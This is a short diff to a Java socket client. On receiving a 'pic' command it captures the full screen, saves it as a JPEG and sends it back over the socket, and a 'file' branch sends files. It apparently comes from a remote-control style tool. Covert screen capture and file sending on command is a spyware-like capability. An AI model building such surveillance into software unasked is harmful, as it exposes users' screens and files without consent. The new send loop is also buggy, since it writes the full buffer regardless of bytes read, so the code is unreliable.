@@ -7,6 +7,7 @@ import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.BufferedInputStream;
 import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -39,24 +40,22 @@ public class Main {
             msg = din.readUTF();
 
             if (msg.equals(pic)) {
-                FileInputStream fis = null;
-                BufferedInputStream bis = null;
-                OutputStream os = null;
 
                 Robot rob = new Robot();
                 BufferedImage image = rob.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                 ImageIO.write(image, "jpg", new File("screenshot.jpg"));
-                
-                InputStream in = sock.getInputStream();
-                OutputStream out = new FileOutputStream("screenshot.jpg");
 
-                byte[] bytes = new byte[16*1024];
+                DataOutputStream dos = new DataOutputStream(sock.getOutputStream());
+                FileInputStream fis = new FileInputStream("screenshot.jpg");
+                byte[] buffer = new byte[4096];
 
-                int count;
-                while ((count = in.read(bytes)) > 0) {
-                    out.write(bytes, 0, count);
+                while (fis.read(buffer) > 0) {
+                    dos.write(buffer);
                 }
-                
+
+                fis.close();
+                dos.close();
+
             } else if (msg.equals(file)) {
                 SendArray sa = new SendArray();
                 SendFile sf = new SendFile();
